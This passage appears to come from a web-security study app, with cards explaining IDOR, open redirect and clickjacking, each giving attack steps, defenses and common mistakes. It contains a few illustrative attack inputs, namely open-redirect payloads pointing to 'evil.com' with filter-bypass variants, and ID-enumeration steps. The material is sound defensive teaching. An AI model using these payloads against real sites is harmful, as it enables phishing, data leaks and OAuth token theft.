IDOR exposes internal object identifiers without proper authorization checks. Attacker enumerates IDs and accesses resources owned by others. Trivial to find, ubiquitous, often high-impact.
② Explanation

Classic shape: GET /api/invoices/1042 returns the invoice without checking whether the caller owns it. Replace 1042 with 1043 → leak. The auth layer says logged in but not allowed.

Variants: sequential IDs (easy), UUIDs (harder but enumerable via leaks), encoded IDs (decode and tamper). Anywhere a numeric or token-like value appears in URL, form or JSON.

Defense is per-request authorization: does the current user own / have access to this object? Not is the user logged in — that's authentication, not authorization.

③ Where It Appears
REST API endpoints
Profile / settings pages
File / document downloads
Multi-tenant SaaS apps
④ How It Works
1Identify a parameter referencing an object
2Note its current value
3Modify to another value
4Observe whether access is granted
5Enumerate to dump data
⑤ Attack & Defense
Attack
  • Sequential ID enumeration
  • UUID harvesting via leaks
  • Modify user_id in JSON body
  • Mass-assignment to elevate role
Defense
  • Server-side ownership check on every read/write
  • Indirect references (per-session tokens)
  • Centralized authZ middleware
  • Automated tests for IDOR
⚠ Common Mistakes
❌ Beliefguessable IDs are fine behind a login
✓ Realitycheck ownership on every object
Why: being logged in is not permission to view someone else's record.
❌ Beliefuse UUIDs and you are safe
✓ RealityUUIDs help, but authorization is the fix
Why: unguessable IDs only slow enumeration; the real fix is a server-side ownership check.
⑥ Remember This
Logged-in is not the same as allowed. Check ownership on every request.
FAQ
What is IDOR?
Insecure Direct Object Reference — changing an ID to access others' data.
How does it work?
Swap id=123 for id=124 when no ownership check exists.
What is the defense?
Server-side authorization that verifies the user owns the object.
Why is it so common?
Developers trust the client not to tamper with IDs.
My Notes
Auto-saved
Learned it? Next:A·11 Authentication BypassS·12 Authorization
cherry root › block 6 › A·08
Open Redirect
Sending users to attacker-controlled URLs via your domain.
A·08webclientphishing
tags: Studied Review Hard Favorite
Before this term:W·05 URL
① Simple Definition
"Your domain shows in the link. The destination is the attacker's site."
Open redirect abuses an endpoint that redirects to a user-supplied URL. /login?next=http://evil.com → after login, browser goes to evil.com. The trust users have in your domain transfers to the destination.
② Explanation

Low impact alone, devastating in chains: bypasses SSO state checks, steals OAuth tokens via redirect_uri tricks, makes phishing links look legitimate.

Bypasses: //evil.com, http://yoursite.com@evil.com, double encoding, whitespace tricks, JavaScript-protocol payloads in some sinks.

Often won't fix in bug bounties but easy to fix: allow-list redirect destinations, prefer relative paths, validate scheme and host.

③ Where It Appears
Login flows (?next=)
OAuth / SAML callbacks
Email-tracking links
Affiliate / share redirects
④ How It Works
1Find a redirect parameter
2Set to attacker URL
3Bypass any naive filter
4Use the trusted domain in phishing
5Land on attacker page with the user's trust intact
⑤ Attack & Defense
Attack
  • Phishing with legit-looking link
  • OAuth token theft via redirect_uri
  • Chain with XSS for cookie steal
  • Bypass referrer-based defenses
Defense
  • Allow-list destinations
  • Prefer relative redirects only
  • Validate scheme + host strictly
  • Show interstitial for off-site links
⚠ Common Mistakes
❌ Beliefredirects are harmless
✓ Realitythey power phishing and OAuth token theft
Why: a trusted domain redirecting to an attacker site makes phishing far more convincing.
❌ Weak fixif "mysite.com" in target: redirect(target)
✓ Real fixallowlist exact, internal targets
Why: evil.com/mysite.com passes a substring check — only an allowlist is safe.
⑥ Remember This
Your domain in the link is a stamp of approval. Make sure it ends where you control.
FAQ
What is an open redirect?
A redirect whose destination is controlled by user input.
How is it abused?
Phishing and stealing OAuth tokens via the redirect URI.
What is the defense?
Allowlist destinations or use relative URLs only.
Why is it underrated?
Low severity alone, but dangerous when chained with other flaws.
My Notes
Auto-saved
Learned it? Next:A·09 ClickjackingW·05 URL
cherry root › block 6 › A·09
Clickjacking
Tricking the user into clicking something they didn't see.
A·09webclientUI
tags: Studied Review Hard Favorite
Before this term:W·08 Headers
① Simple Definition
"Invisible iframe over a button. They think they hit Like. They hit Transfer."
Clickjacking (UI redress) loads a target page in a transparent iframe overlaid on bait content. User clicks where they see a button — the click actually lands on the hidden frame, performing actions on the target site with their session.
② Explanation

Variants: keystroke jacking (typed input goes to the hidden frame), drag-and-drop attacks, cursor-jacking. Mobile equivalents (tapjacking) on Android.

Impact: enable webcam, change settings, transfer money, like/follow attacker accounts. Severity depends on what one click can do on the target.

Defense is server-side: set X-Frame-Options: DENY or modern Content-Security-Policy: frame-ancestors none. Don't rely on JS framebusters — they can be defeated.

③ Where It Appears
Banking dashboards
Social media actions
Webcam / mic permissions prompts
Cryptocurrency wallets
④ How It Works
1Attacker embeds target page in invisible iframe
2Overlays decoy content (game, button)
3Aligns target's sensitive button under decoy
4Victim clicks decoy
5Click registers on the hidden target
⑤ Attack & Defense
Attack
  • Transparent iframe + decoy UI
  • Cursor-jacking for misaligned clicks
  • Combine with social engineering
Defense
  • X-Frame-Options: DENY
  • CSP frame-ancestors none
  • Re-confirm dangerous actions (password, OTP)
